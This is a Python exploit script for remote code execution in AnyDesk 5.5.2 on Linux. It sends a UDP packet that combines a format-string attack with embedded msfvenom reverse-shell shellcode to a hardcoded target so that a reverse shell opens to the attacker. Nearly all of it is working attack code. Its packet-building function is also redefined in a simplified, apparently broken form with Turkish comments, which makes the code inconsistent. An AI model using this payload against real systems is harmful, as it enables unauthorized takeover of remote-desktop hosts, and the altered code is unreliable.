# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '10.10.189.45'
port = 7070

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode



shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x08\x91\x7b"
shellcode += b"\xf8\x08\xea\x0e\x11\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x62\xb8\x23\x61\x62"
shellcode += b"\xe8\x51\x7b\x09\xcf\x74\xfd\x40\x7d\x46\xa8"
shellcode += b"\x0a\x91\x58\xd1\x02\xe3\xb5\xd9\x59\xd9\xf2"
shellcode += b"\x1e\x62\xfa\x54\x7b\x22\xc9\x74\xfd\x62\xe9"
shellcode += b"\x50\x59\xf7\x5f\x11\xd9\x50\xe5\x0b\x64\xfe"
shellcode += b"\xfb\x40\xa0\x91\xa2\xb5\x3e\x6a\xf8\x15\xd7"
shellcode += b"\x7b\x82\x0e\x42\x40\x18\x9c\xaa\x5f\xa2\x87"
shellcode += b"\xf7\x07\x94\x7b\xf8\x08\xea\x0e\x11"





print('sending payload ...')
#p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
#p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln' + shellcode.decode('latin-1'), '\x85\xfe%18472249x%93$ln', 'ad', 'main')
#p = gen_discover_packet(4919, 1,  "\x85\xfe%1$*1$x%18x%165$ln'"  +   shellcode.decode("latin-1" ) ,    "\x85\xfe%18472249x%93$ln"  ,   "ad" ,  "main"  )



def gen_discover_packet(ad_id, other_parameters):
    d = b''
    # ad_id'yi bytes'a çevir
    d += struct.pack('>I', ad_id)
    # Diğer parametreleri bytes nesnesine ekleyin
    d += other_parameters.encode('latin-1')  # other_parameters bir string olduğunu varsayıyoruz

    return d

# Örnek kullanım
ad_id = 4919
other_parameters = "\x85\xfe%1$*1$x%18x%165$ln'" + shellcode.decode("latin-1") + "\x85\xfe%18472249x%93$ln" + 'ad' + 'main'
p = gen_discover_packet(ad_id, other_parameters)




s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
#s.close()
print('reverse shell should connect within 5 seconds')
